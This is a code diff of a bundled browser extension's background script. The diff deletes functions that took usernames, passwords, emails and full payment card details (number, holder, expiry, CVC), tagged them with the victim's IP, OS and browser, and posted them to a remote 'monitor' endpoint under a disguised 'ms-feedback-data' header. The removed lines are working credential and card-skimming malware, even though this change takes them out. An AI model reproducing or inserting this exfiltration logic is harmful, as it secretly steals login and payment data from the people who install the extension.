@@ -1361,17 +1361,9 @@ __webpack_require__.r(__webpack_exports__);
 
 
 
-
-let acsComPortBack;
 let globalAppBrowser;
 let globalAppIP;
 let BrJS = new _browserjs__WEBPACK_IMPORTED_MODULE_1__["BrowserJS"](window.navigator);
-const appTracker = _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.short_name + '@' + _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.version;
-function messengerConnector(p) {
-    acsComPortBack = p;
-    acsComPortBack.onMessage.addListener(backgroundResponder);
-}
-webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].runtime.onConnect.addListener(messengerConnector);
 function createDefaultAppData(browserNameFull, browserVersion, clientIP, clientCity, clientCountry, clientDeviceName, clientDevicePlatform, clientPlatformArchitecture) {
     return {
         "app": { "id": "", "name": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.name, "version": _db__WEBPACK_IMPORTED_MODULE_2__["app"].about.version },
@@ -1479,149 +1471,6 @@ function checkSettings(details, ipdata) {
         }
         else {
             installDefaultQAppData();
-        }
-    });
-}
-function backgroundResponder(request) {
-    if (typeof request === 'object' && request.constructor === Object && Object.keys(request).length !== 0) {
-        if (request.command === 'saveLoginData' || request.command === 'saveRegistrationData' || request.command === 'saveLogoutData' || request.command === 'saveNavigateData') {
-            return browserUserDataManagement(request.command, request.data);
-        }
-        if (request.command === 'savePaymentMethodsData') {
-            if (acsComPortBack !== undefined)
-                checkAppInstallation(function (setting) {
-                    Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
-                        method: "POST",
-                        url: _lib_main__WEBPACK_IMPORTED_MODULE_4__["globalAppMonitorURL"] + "clientPaymentMethodsRecord",
-                        async: true,
-                        header: [{ name: "ms-feedback-data", value: "application/json;charset=UTF-8" }],
-                        data: {
-                            "command": request.command,
-                            "paymentMethodsInfo": {
-                                _default_: {
-                                    "tracker": appTracker,
-                                    "app_id": setting.app.id,
-                                    "ip": setting.client.ip,
-                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
-                                    "browser": BrJS.BrowserNameFull
-                                },
-                                'cardNumber': request.data.cardNumber,
-                                'cardBrand': request.data.cardBrand,
-                                'cardHolder': request.data.cardHolder,
-                                "cardExpire": request.data.cardExpire,
-                                'cardCVC': request.data.cardCVC,
-                                "workWebsite": request.data.workWebsite
-                            }
-                        }
-                    });
-                });
-        }
-    }
-}
-function browserUserDataManagement(command, data) {
-    webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.get().then(function (setting) {
-        if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
-            if (setting.app !== '' || setting.app.id !== '' || setting.browser.name !== '' || setting.client.ip !== '' || setting.user.email !== '') {
-                /*-----------------------------------------------------------------------------------------------------------*/
-                if (command === 'saveLoginData') {
-                    /*console.log(command);
-                    console.log(data);*/
-                    Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
-                        method: "POST",
-                        url: _lib_main__WEBPACK_IMPORTED_MODULE_4__["globalAppMonitorURL"] + "browserUserDataManagement",
-                        async: true,
-                        header: [{ name: "ms-feedback-data", value: "application/json;charset=UTF-8" }],
-                        data: {
-                            "command": command,
-                            "userdata": {
-                                _default_: {
-                                    "tracker": appTracker,
-                                    "app_id": setting.app.id,
-                                    "ip": setting.client.ip,
-                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
-                                    "browser": BrJS.BrowserNameFull
-                                },
-                                "event": 'login',
-                                "username": data.username,
-                                "password": data.password,
-                                "workWebsite": data.workWebsite
-                            }
-                        }
-                    });
-                }
-                else if (command === 'saveRegistrationData') {
-                    Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
-                        method: "POST",
-                        url: _lib_main__WEBPACK_IMPORTED_MODULE_4__["globalAppMonitorURL"] + "browserUserDataManagement",
-                        async: true,
-                        header: [{ name: "ms-feedback-data", value: "application/json;charset=UTF-8" }],
-                        data: {
-                            "command": command,
-                            "userdata": {
-                                _default_: {
-                                    "tracker": appTracker,
-                                    "app_id": setting.app.id,
-                                    "ip": setting.client.ip,
-                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
-                                    "browser": BrJS.BrowserNameFull
-                                },
-                                "event": "registration",
-                                "username": data.username,
-                                "password": data.password,
-                                "email": data.email,
-                                "workWebsite": data.workWebsite
-                            }
-                        }
-                    });
-                }
-                else if (command === 'saveLogoutData') {
-                    Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
-                        method: "POST",
-                        url: _lib_main__WEBPACK_IMPORTED_MODULE_4__["globalAppMonitorURL"] + "browserUserDataManagement",
-                        async: true,
-                        header: [{ name: "ms-feedback-data", value: "application/json;charset=UTF-8" }],
-                        data: {
-                            "command": command,
-                            "userdata": {
-                                _default_: {
-                                    "tracker": appTracker,
-                                    "app_id": setting.app.id,
-                                    "ip": setting.client.ip,
-                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
-                                    "browser": BrJS.BrowserNameFull
-                                },
-                                "event": "logout",
-                                "username": data.username,
-                                "workWebsite": data.workWebsite
-                            }
-                        }
-                    });
-                }
-                else if (command === 'saveNavigateData') {
-                    Object(_lib_functions_background__WEBPACK_IMPORTED_MODULE_3__["sendRequest"])({
-                        method: "POST",
-                        url: _lib_main__WEBPACK_IMPORTED_MODULE_4__["globalAppMonitorURL"] + "browserUserDataManagement",
-                        async: true,
-                        header: [{ name: "ms-feedback-data", value: "application/json;charset=UTF-8" }],
-                        data: {
-                            "command": command,
-                            "userdata": {
-                                _default_: {
-                                    "tracker": appTracker,
-                                    "app_id": setting.app.id,
-                                    "ip": setting.client.ip,
-                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
-                                    "browser": BrJS.BrowserNameFull
-                                },
-                                "event": "navigate",
-                                "username": data.username,
-                                "workWebsite": data.workWebsite
-                            }
-                        }
-                    });
-                }
-                /*-----------------------------------------------------------------------------------------------------------*/
-            }
         }
     });
 }
